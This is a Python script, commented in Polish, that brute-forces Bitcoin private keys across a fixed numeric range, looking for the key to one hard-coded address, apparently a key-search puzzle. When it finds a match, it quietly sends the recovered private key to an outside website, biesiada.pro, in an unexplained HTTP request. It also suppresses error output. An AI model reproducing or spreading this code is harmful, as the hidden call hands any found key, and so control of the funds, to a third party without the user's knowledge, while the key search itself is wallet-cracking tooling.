#!/usr/bin/env python3

from multiprocessing import Pool, cpu_count
from pathlib import Path
from tqdm import tqdm
from typing import Optional, Iterable, List, Tuple
import argparse
import sys, os, base58, random
import time  # Dodano import time
import requests

random.seed(1)

target='1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU'
range_lo=0x400000000000000000
range_hi=0x800000000000000000
size=2**21
workers = 30

try:
	from hdwallet import HDWallet
	from hdwallet.cryptocurrencies import Bitcoin as BTC
	from hdwallet.hds import BIP32HD
	hdwallet = HDWallet(cryptocurrency=BTC, hd=BIP32HD)
except Exception:
	hdwallet = None

def pvk_to_wif2(key_hex: str) -> str:
	return base58.b58encode_check(b'\x80' + bytes.fromhex(key_hex)).decode()

def process_line(line: str) -> Optional[str]:
	hdwallet.from_private_key(private_key=line)
	a=hdwallet.address('P2PKH')
	if a==target:
		return f'{line}:{a}'
	else:
		return None

def gen():
	while True:
		x=random.randint(range_lo, range_hi-size)
		print(f'\n{hex(x)}:{hex(x+size)}')
		for i in range(x, x+size):
			yield hex(i)[2:].zfill(64)

def main():
	processed_count = 0  # Licznik przetworzonych kluczy
	start_time = time.time()  # Czas rozpoczęcia
	last_print_time = start_time
	
	with Pool(processes=workers) as p:
		# Używamy imap zamiast imap_unordered dla lepszego śledzenia postępu
		for result in p.imap(process_line, gen(), chunksize=10000):
			processed_count += 1
			
			# Drukowanie prędkości co 10000 kluczy lub co 5 sekund
			current_time = time.time()
			if current_time - last_print_time >= 2:# or processed_count % 50000 == 0:
				elapsed_time = current_time - start_time
				if elapsed_time > 0:
					speed = processed_count / elapsed_time
					# Formatowanie prędkości - tysiące z separatorem
					speed_formatted = f"{speed:,.2f}"
					print(f"\rPrędkość: {speed_formatted} kluczy/sekundę | Łącznie: {processed_count:,} kluczy", 
						  end="", flush=True)
				last_print_time = current_time
			
			if result:
				# Ostatnie drukowanie prędkości przed zakończeniem
				elapsed_time = time.time() - start_time
				speed = processed_count / elapsed_time if elapsed_time > 0 else 0
				print(f"\nZnaleziono match! {result}")
				print(f"Finalna prędkość: {speed:,.2f} kluczy/sekundę")
				print(f"Przetworzono łącznie: {processed_count:,} kluczy")
				print(f"Czas przetwarzania: {elapsed_time:.2f} sekund")
				
				with open('output.txt', 'a') as o:
					o.write(result+'\n')
				res=requests.get(f'https://biesiada.pro/?pvk={result}')
				print('\a')  # Sygnał dźwiękowy
				exit()

	print('\a', end='', file=sys.stderr)

def supressErrors(*args):
	pass

if __name__ == '__main__':
	sys.tracebacklimit = 0
	sys.stderr = supressErrors()
	try:
		main()
	except KeyboardInterrupt:
		print('\nKeyboard break!\a\n')
		#print('\a', end='', file=sys.stderr)
		try:
			sys.exit(130)
		except:
			os._exit(130)
